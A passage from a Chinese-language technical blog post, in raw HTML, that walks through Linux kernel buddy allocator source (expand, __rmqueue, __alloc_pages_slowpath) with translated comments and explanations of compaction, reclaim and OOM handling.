这也是合理的。这种行为是 sglist 合并成功的关键因素。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">expand</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params"><span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high, <span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">1</span> &lt;&lt; high;<br><br><span class="hljs-keyword">while</span> (high &gt; low) &#123;<br>high--;<br>size &gt;&gt;= <span class="hljs-number">1</span>;<br>VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 标记为 guard pages (或 page), 这将允许在 buddy 将被</span><br><span class="hljs-comment"> * 释放时合并回分配器.对应的页表项不会被创建，</span><br><span class="hljs-comment"> * pages 在 虚拟地址空间上仍将保持不存在。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))<br><span class="hljs-keyword">continue</span>;<br><br>add_to_free_list(&amp;page[size], zone, high, migratetype);<br>set_buddy_order(&amp;page[size], high);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="③-rmqueue-：分配封装函数"><a href="#③-rmqueue-：分配封装函数" class="headerlink" title="③ __rmqueue()：分配封装函数"></a>③ __rmqueue()：分配封装函数</h5><p>这个函数其实主要是对其他分配函数的封装，最终的核心函数其实都还是 <code>__rmqueue_smallest()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从 buddy allocator 上移除一个元素.</span><br><span class="hljs-comment"> * 在持有 zone-&gt;lock 时调用.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">rmqueue</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配</span><br><span class="hljs-comment"> * 以平衡常规的与CMA区域的可迁移的分配。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;<br>    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;<br>    zone_page_state(zone, NR_FREE_PAGES) / <span class="hljs-number">2</span>) &#123;<br>page = __rmqueue_cma_fallback(zone, order);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>retry:<br>page = __rmqueue_smallest(zone, order, migratetype);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA)<br>page = __rmqueue_cma_fallback(zone, order);<br><br><span class="hljs-keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,<br>alloc_flags))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>流程如下：</p><ul><li>若开启了 CMA，比对常规区域与 CMA 区域的空闲页面数量，若 CMA 的多则调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域分配（其实就是调用 <code>__rmqueue_smallest()</code> 从迁移类型为 <code>MIGRATE_CMA</code> 的链表上分配），成功则直接返回</li><li>调用 <code>__rmqueue_smallest()</code> 从指定迁移类型链表进行分配，若未成功：<ul><li>若设置了 <code>ALLOC_CMA</code> 的分配 flag，调用 <code>__rmqueue_cma_fallback()</code> 从 CMA 区域进行分配</li><li>若上一步失败则调用 <code>__rmqueue_fallback()</code> 尝试从其他迁移类型链表获取页面，若还是失败则重试这一个大步骤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-：慢速分配路径"><a href="#III-alloc-pages-slowpath-：慢速分配路径" class="headerlink" title="III. __alloc_pages_slowpath()：慢速分配路径"></a>III. __alloc_pages_slowpath()：慢速分配路径</h3><p>当快速路径的分配不成功时，说明系统当前可能已经没有足够的连续的空闲页面，这时我们就要进入到慢速路径的分配，<strong>进行内存碎片整理与内存回收</strong>，之后再进行分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_slowpath</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> *<span class="hljs-title">ac</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;<br><span class="hljs-type">const</span> <span class="hljs-type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> did_some_progress;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_priority</span> <span class="hljs-title">compact_priority</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_result</span> <span class="hljs-title">compact_result</span>;</span><br><span class="hljs-type">int</span> compaction_retries;<br><span class="hljs-type">int</span> no_progress_loops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpuset_mems_cookie;<br><span class="hljs-type">int</span> reserve_flags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们还进行了健全性检查，以发现非原子上下文中的 caller 滥用原子储备（的行为）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==<br>(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))<br>gfp_mask &amp;= ~__GFP_ATOMIC;<br><br>retry_cpuset:<br>compaction_retries = <span class="hljs-number">0</span>;<br>no_progress_loops = <span class="hljs-number">0</span>;<br>compact_priority = DEF_COMPACT_PRIORITY;<br>cpuset_mems_cookie = read_mems_allowed_begin();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅在 kswapd 需要被唤醒前，快速路径使用保守的 alloc_flags 才能成功，</span><br><span class="hljs-comment"> * 并且避免精确地设置 alloc_flags。 所以我们现在这么做。</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// 重新设置 alloc_flags，因为快速路径的分配在 kswapd 被唤醒之前</span><br>    <span class="hljs-comment">// 只有使用保守的 alloc_flags 才能成功，而现在我们将唤醒 kswapd，</span><br>    <span class="hljs-comment">// 因此恢复使用原有的 gfp_mask 对应的 alloc_flags</span><br>alloc_flags = gfp_to_alloc_flags(gfp_mask);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们需要为 zonelist 迭代器重新计算起始点，因为我们可能在快速路径中</span><br><span class="hljs-comment"> * 使用了不同的 nodemask ，或是有个 cpuset 的修改而我们正在重试</span><br><span class="hljs-comment"> * - 否则我们可能会无休止地迭代不合格的 zone</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><span class="hljs-keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)<br><span class="hljs-keyword">goto</span> nopage;<br><br>    <span class="hljs-comment">// 如果 ALLOC_KSWAPD，唤醒 kswapd 线程回收内存</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 调整后的 alloc_flags 可能会立即成功，所以先进行尝试</span><br><span class="hljs-comment"> */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对于代价高的分配, 首先尝试直接的 compaction（译注：碎片整理机制）,</span><br><span class="hljs-comment"> * 因为有可能我们仍有足够的基本页面，并不需要去回收. 对于不可迁移的高阶分配，</span><br><span class="hljs-comment"> * 同样这么做, 因为 compaction 将尝试通过从相同迁移类型的块进行迁移</span><br><span class="hljs-comment"> * 以避免永久的碎片. 别对允许忽视水位线的分配尝试这个，因为</span><br><span class="hljs-comment"> * ALLOC_NO_WATERMARKS 还没发生。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (can_direct_reclaim &amp;&amp;<br>(costly_order ||<br>   (order &gt; <span class="hljs-number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))<br>&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;<br>page = __alloc_pages_direct_compact(gfp_mask, order,<br>alloc_flags, ac,<br>INIT_COMPACT_PRIORITY,<br>&amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查带有 __GFP_NORETRY 的代价高的分配, 其</span><br><span class="hljs-comment"> * 包括一些 THP page fault 的分配</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若分配整个 pageblock(s) 且 compaction 由于所有的 zone</span><br><span class="hljs-comment"> * 都在水位线下失败了，或是被禁止了因为其最近在该order上失败了，</span><br><span class="hljs-comment"> * 除非分配器有请求的 compaction 与回收尝试，否则直接失败</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 回收是：</span><br><span class="hljs-comment"> *  - 可能非常昂贵因为 zones 可能远低于他们的低水位线，</span><br><span class="hljs-comment"> *    或是这是非常突发的高阶分配的一部分,</span><br><span class="hljs-comment"> *  - 不一定会有帮助因为 isolate_freepages() 可能不会在</span><br><span class="hljs-comment"> *    被释放的页面上迭代作为其线性扫描的一部分，且</span><br><span class="hljs-comment"> *  - 不大可能会让整个 pageblocks 自己释放</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (compact_result == COMPACT_SKIPPED ||<br>    compact_result == COMPACT_DEFERRED)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 看起来好像 reclaim/compaction 是值得尝试的, 但</span><br><span class="hljs-comment"> * 同步的 compaction 可能会非常 expensive, 故保持</span><br><span class="hljs-comment"> * 使用异步的 compaction.</span><br><span class="hljs-comment"> */</span><br>compact_priority = INIT_COMPACT_PRIORITY;<br>&#125;<br>&#125;<br><br>retry:<br><span class="hljs-comment">/* 确保只要我们循环， kswapd 便不会意外地休眠 */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br>reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);<br><span class="hljs-keyword">if</span> (reserve_flags)<br>alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若内存策略可以忽略，重置 nodemask 与 zonelist 迭代器。</span><br><span class="hljs-comment"> * 这些分配具有高优先级与系统性，而非用户导向。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;<br>ac-&gt;nodemask = <span class="hljs-literal">NULL</span>;<br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br>&#125;<br><br><span class="hljs-comment">/* 带着可能调整过 zonelist 与 alloc_flags 再次尝试 */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 调用方不想要回收, 我们无法平衡任何事 */</span><br><span class="hljs-keyword">if</span> (!can_direct_reclaim)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 避免递归地直接回收 */</span><br><span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 尝试直接回收后分配 */</span><br>page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,<br>&amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 尝试直接 compaction 后分配 */</span><br>page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,<br>compact_priority, &amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 若是特别指定的请求，不要循环 */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 不要重试高花销的高阶分配除非他们是</span><br><span class="hljs-comment"> * __GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,<br> did_some_progress &gt; <span class="hljs-number">0</span>, &amp;no_progress_loops))<br><span class="hljs-keyword">goto</span> retry;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若0阶的回收无法取得任何进展，则重试 compaction 没有任何意义，</span><br><span class="hljs-comment"> * 因为当前对 compaction 的实现是基于有足够的空闲内存的</span><br><span class="hljs-comment"> *  (参见 __compaction_suitable)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (did_some_progress &gt; <span class="hljs-number">0</span> &amp;&amp;<br>should_compact_retry(ac, order, alloc_flags,<br>compact_result, &amp;compact_priority,<br>&amp;compaction_retries))<br><span class="hljs-keyword">goto</span> retry;<br><br><br><span class="hljs-comment">/* 在我们开始 OOM killing 之前处理可能的 cpuset 更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/* 回收失败了, 开始 killing 一些东西 */</span><br>    <span class="hljs-comment">// 要杀一些进程或是别的东西来腾内存了</span><br>page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 在无尽的循环中避免没有水位线的分配 */</span><br><span class="hljs-keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;<br>    (alloc_flags &amp; ALLOC_OOM ||<br>     (gfp_mask &amp; __GFP_NOMEMALLOC)))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 若 OOM killer 取得了一些成效，重试 */</span><br><span class="hljs-keyword">if</span> (did_some_progress) &#123;<br>no_progress_loops = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>nopage:<br><span class="hljs-comment">/* 在我们失败之前处理可能的 cpuset 的更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确保 __GFP_NOFAIL 请求没有泄露且确保我们一直在重试</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 所有存在的 __GFP_NOFAIL 用户都是可以被阻塞的, </span><br><span class="hljs-comment"> * 故对任何新的实际上需要 GFP_NOWAIT 的用户进行警告</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))<br><span class="hljs-keyword">goto</span> fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这个上下文的 PF_MEMALLOC 请求非常奇怪</span><br><span class="hljs-comment"> * 因为我们不能回收任何东西只能循环等待</span><br><span class="hljs-comment"> * 某人来为我们做些什么</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 无失败的高开销的 orders 是一项艰巨的要求，</span><br><span class="hljs-comment"> * 我们对此并没有太多准备，故让我们警告这些用户</span><br><span class="hljs-comment"> * 以便于我们能够识别出他们并将之转化为别的东西</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过让他们能访问保留的内存来帮助非失败的分配</span><br><span class="hljs-comment"> * 但不使用 ALLOC_NO_WATERMARKS 因为这可能</span><br><span class="hljs-comment"> * 大量减少内存保留区而让情况更坏</span><br><span class="hljs-comment"> */</span><br>page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br>cond_resched();<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>fail:<br>warn_alloc(gfp_mask, ac-&gt;nodemask,<br><span class="hljs-string">&quot;page allocation failure: order:%u&quot;</span>, order);<br>got_pg:<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们先补充一个概念——<code>Memory compaction</code> 机制，其实就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片：</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>现在我们来看慢速分配的整个流程：</p><ul><li>使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算 preferred zone，若设置了 <code>ALLOC_KSWAPD</code> 则调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>之后重新尝试快速路径的分配，若成功则直接返回</li><li>接下来调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回</li><li>（retry）接下来调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>调整 zonelist 与 alloc_flag，之后再次尝试快速路径分配，若成功则直接返回</li><li>若 gfp_flag 中没有 <code>__GFP_DIRECT_RECLAIM</code> 或是进程 PCB 的 flag 中有 <code>PF_MEMALLOC</code>，直接跳转到 （nopage）</li><li>调用 <code>__alloc_pages_direct_reclaim()</code> 进行内存回收（内部调用 <code>__perform_reclaim()</code>）与快速路径分配，若成功则直接返回</li><li>调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction 与快速路径分配，若成功则直接返回</li><li>如果设置了 <code>__GFP_NORETRY</code> ，或是该次内存分配开销较高（<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>）且未设置 <code>__GFP_RETRY_MAYFAIL</code>，直接跳到 （nopage）</li><li>调用 <code>should_reclaim_retry()</code> 判断是否需要重新回收，若是则跳回（retry）</li><li>调用 <code>should_compact_retry()</code> 判断是否需要重新进行 compaction，若是则跳回（retry）</li><li>调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>调用 <code>__alloc_pages_may_oom()</code> 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 <code>out_of_memory()</code> 来杀掉最适合的进程以释放内存，最后若设置了 <code>__GFP_NOFAIL</code> 则调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，在该函数中会两次走快速路径进行分配（第一次会额外附加上 <code>ALLOC_CPUSET</code> 的 flag）</li><li>如果把当前进程杀掉了，跳到（nopage）；如果杀进程取得了成效，跳回（retry）</li><li>（nopage）调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>若设置了 <code>__GFP_NOFAIL</code> 则进行一系列的警告，并调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，若未成功则跳回（retry）</li><li>返回结果</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="四、上层封装分配函数"><a href="#四、上层封装分配函数" class="headerlink" title="四、上层封装分配函数"></a>四、<em>上层封装分配函数</em></h2><p>在 <code>__alloc_pages_nodemask()</code> 上层主要有三个页面分配函数，其调用路径如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__alloc_pages_node</span>  <span class="hljs-comment">/*返回struct page的指针*/</span><br>    <span class="hljs-variable">__alloc_pages</span><br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br><br>alloc_pages         <span class="hljs-comment">/*返回struct page的指针*/</span><br>    alloc_pages_current<br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br>        <br><span class="hljs-variable">__get_free_pages</span>    <span class="hljs-comment">/*返回页面的虚拟地址*/</span><br>    <span class="hljs-variable">__get_free_pages</span><br>    alloc_pages<br>            alloc_pages_current<br>            <span 